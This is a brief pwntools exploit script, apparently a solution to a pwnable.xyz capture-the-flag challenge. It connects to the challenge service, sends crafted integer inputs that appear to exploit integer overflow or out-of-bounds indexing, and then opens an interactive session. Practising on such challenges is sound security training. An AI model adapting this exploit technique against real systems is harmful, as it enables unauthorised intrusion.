from pwn import *

r = remote('svc.pwnable.xyz', 30008)

r.sendlineafter(b'x: ', b'4294967295')
r.sendlineafter(b'y: ', b'4294965958')
r.recvline()
r.sendline(b'3 1431656211')
r.recvline()
r.sendline(b'0 '*5)

r.interactive()
